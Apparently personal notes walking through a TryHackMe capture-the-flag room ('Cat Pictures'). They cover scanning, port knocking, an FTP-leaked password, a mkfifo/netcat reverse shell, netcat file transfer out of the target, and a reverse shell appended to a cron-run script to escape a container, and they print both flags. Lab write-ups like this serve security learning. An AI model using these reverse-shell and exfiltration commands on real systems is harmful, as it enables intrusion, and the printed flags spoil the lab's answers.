
### Nmap

- took few attempts for
```
   │   ~/Desktop/THM/cat-pictures ▓▒░ nmap -p- -T5 --min-rate=10000 10.10.34.173

PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```


it gives out his error

`Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn`


it takes some time for machine to run properly

- only two ports are open

regenerated the onvp config and still not able to ping the machine


- Had to use the attackbox now they are reachable

- restarted the machine and good to go

### HTTP

- ran a feroxbuster command and got this

```
301        7l       20w      241c http://10.10.31.35:8080/download
200      319l      854w        0c http://10.10.31.35:8080/index.php
301        7l       20w      237c http://10.10.31.35:8080/docs
403        7l       20w      199c http://10.10.31.35:8080/files
200      305l      900w        0c http://10.10.31.35:8080/search.php
403        7l       20w      199c http://10.10.31.35:8080/common.php
301       12l       22w      462c http://10.10.31.35:8080/faq.php
403        7l       20w      199c http://10.10.31.35:8080/store
```

 again got some connectivity issue, changed my VPN server to US

 still getting connectivity errors

- on viewing
http://10.10.31.35:8080/download - this is blank
http://10.10.1.64:8080/files - this is forbidden


- Trying to register a users - we get these in terms and conditions http://10.10.62.240:8080/ucp.php?mode=register
```text
Our forums are powered by phpBB (hereinafter “they”, “them”, “their”, “phpBB software”, “www.phpbb.com”, “phpBB Limited”, “phpBB Teams”) which is a bulletin board solution released under the “[GNU General Public License v2](http://opensource.org/licenses/gpl-2.0.php)” (hereinafter “GPL”) and can be downloaded from [www.phpbb.com](https://www.phpbb.com/).
```

also this

``` text
In order to login you must be registered. Registering takes only a few moments but gives you increased capabilities. The board administrator may also grant additional permissions to registered users. Before you register please ensure you are familiar with our terms of use and related policies. Please ensure you read any forum rules as you navigate around the board.
```


- created a users with `admin` `admin` and `admin@gmail.com`

and got this error 

```
The password you entered is too short.  
The password confirmation you entered is too short.  
The entered email domain has no valid MX record.
```

- also tried others registration methods, but this error persists
```
The entered email domain has no valid MX record.
```

- There was a single post whose contents are 
```
POST ALL YOUR CAT PICTURES HERE ![:)](http://10.10.62.240:8080/images/smilies/icon_e_smile.gif "Smile")  
  
Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```


and this users who posted is the site admin

```
[user](http://10.10.62.240:8080/memberlist.php?mode=viewprofile&u=2)

Site Admin
```

- Used writeup for this 
missed this resource as i skipped recursive scanning and here we can see the installed version of `phpbb`

http://10.10.125.234:8080/docs/CHANGELOG.html


- another url we can refer for installed version is http://TARGET_IP:8080/styles/prosilver/style.cfg


---


### Port Knocking and initial foothold

- learnt a new concept here
```
Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

- this was a hint for port knocking


```
 port knocking is a method of externally opening [ports]non a [firewall]by generating a connection attempt on a set of prespecified closed ports. 
 
 Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s).
```


- used this writeup bash script for port knocking command

```bash
for PORT in 1111 2222 3333 4444; do nc -vz TARGET_IP $PORT; done;
```

```bash
   │   ~ ▓▒░ for PORT in 1111 2222 3333 4444; do nc -vz 10.10.125.234 $PORT; done;
```


- after running the above command, we do a port scan
```
   │   ~ ▓▒░  nmap -p 21,22,2375,4420,8080 10.10.125.234                                      ░▒▓ 1 ✘ │ 18:12:05   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 18:12 IST
Nmap scan report for 10.10.125.234
Host is up (0.13s latency).

PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
2375/tcp closed docker
4420/tcp open   nvm-express
8080/tcp open   http-proxy

```


- now we see an ftp port as open with anonymous login allowed and we find a `note.txt` with the content

```
cat note.txt                                                                       ░▒▓ ✔ │ 18:14:04   
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```

- now as per the note i connected to he `4420` port with the command
```
   │   ~/De/THM/cat-pictures ▓▒░ nc -v 10.10.125.234 4420

Please enter password:
sardinethecat
```

and we get a shell


- here we are not able to run much commands and normal `ls` and `cd` were not working so had to use

```bash
ls home
catlover
ls home/catlover
runme
cat home/catlover/runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```

- strated a reverse shell using

```bash

  │   ~/De/TH/shellgen │    master ▓▒░ ./shellgen tun0 9992 nc

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.24.189 9992 >/tmp/f
```


and we get a bash shell but still wilth limited commands  


- when we run the executable and enter the password we are still denied 
```
# home/catlover/runme        
Please enter yout password: sardinethecat
Access Denied

```

- now as per writeup we can download the file on our system using netcat

- on local machine machine `nc -vlp 9999 > runme`


- on target machine `nc -N 10.17.24.189 9999 < /home/catlover/runme`

also added this to notes [[transfer files via netcat from target to local]]

- on viewing the contents of `runme` 

```bash
  │   ~/De/TH/ca/loot ▓▒░ strings runme 


rebecca
Please enter yout password: 
Welcome, catlover! SSH key transfer queued! 
touch /tmp/gibmethesshkey
Access Denied
```

- after running the `runme` binary with `rebecca` as password a file with name `id_rsa` is generated

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
.
.
.
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----
```

- now we are able to ssh into the machine with above rsa key

```
   │   ~/De/TH/cat-pictures ▓▒░ ssh catlover@10.10.3.44 -i id_rsa 
```

- but it is showing as root user. I Dont know how ?

```
root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
```

- we find the first flag

```
root@7546fa2336d6:/root# cat flag.txt 
7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9

```

but this is not the root flag


### Priv Esc

- now as per writeup
```
Next step is to escape the container and gain access to the host system.

A quick [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) scan shows us the following:


/dev/xvda1 20G 7.3G 12G 40% /opt/clean
```

- And /opt/clean has a simple bash script clean.sh that we can edit.


- It looks like this script could be ran as a cron job on the host system to clean up the `/tmp`.

- To test this theory, all we need to do is to modify `/opt/clean/clean.sh` and add a reverse shell payload to it:

```bash
#!/bin/bash

rm -rf /tmp/*
bash -i >& /dev/tcp/10.17.24.189/4444 0>&1
```

- strated a nc listener and we get a shell

```bash
   │   ~/Desktop/THM/cat-pictures ▓▒░ nc -lnvp 4444                                             ░▒▓ ✔ │ 19:20:05   
listening on [any] 4444 ...
connect to [10.17.24.189] from (UNKNOWN) [10.10.3.44] 58498
bash: cannot set terminal process group (2043): Inappropriate ioctl for device
bash: no job control in this shell
root@cat-pictures:~# 

```

- and the flag
```
root@cat-pictures:~# cat root.txt
cat root.txt
Congrats!!!
Here is your flag:

4a98e43d78bab283938a06f38d2ca3a3c53f0476

```

```
root@cat-pictures:~# pwd
pwd
/root
```